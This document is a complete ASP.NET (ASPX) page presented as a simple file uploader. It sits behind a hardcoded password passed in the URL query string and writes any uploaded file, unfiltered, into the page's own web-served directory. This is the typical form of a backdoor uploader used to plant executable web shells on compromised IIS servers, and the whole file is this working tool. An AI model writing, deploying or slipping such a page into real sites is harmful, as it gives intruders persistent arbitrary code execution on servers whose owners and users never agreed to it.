<%@ Page Language="C#" AutoEventWireup="true" %>
<%@ Import Namespace="System.IO" %>
<%
    // ===== CONFIG =====
    string PASSWORD = "admin987654321!@";  // Change this to whatever password you want
    string UPLOAD_DIR = Server.MapPath("."); // Current directory

    // ===== AUTH CHECK =====
    string p = Request.QueryString["p"];
    if (string.IsNullOrEmpty(p) || p != PASSWORD)
    {
        Response.StatusCode = 403;
        Response.Write("Access Denied");
        Response.End();
    }

    // ===== UPLOAD LOGIC =====
    if (IsPostBack && Request.Files.Count > 0)
    {
        var file = Request.Files[0];
        if (file != null && file.ContentLength > 0)
        {
            string fileName = Path.GetFileName(file.FileName);
            string savePath = Path.Combine(UPLOAD_DIR, fileName);

            try
            {
                file.SaveAs(savePath);
                Response.Write("✅ File uploaded successfully!<br>");
                Response.Write("File Name: " + Server.HtmlEncode(fileName) + "<br>");
                Response.Write("Location: Current Directory<br>");
            }
            catch (Exception ex)
            {
                Response.Write("❌ Upload failed: " + Server.HtmlEncode(ex.Message));
            }
        }
    }
%>

<!DOCTYPE html>
<html>
<head>
    <title>ASPX File Uploader</title>
</head>
<body>
<h2>ASPX File Uploader</h2>

<form method="post" enctype="multipart/form-data">
    <input type="file" name="file" required>
    <button type="submit">Upload</button>
</form>

</body>
</html>
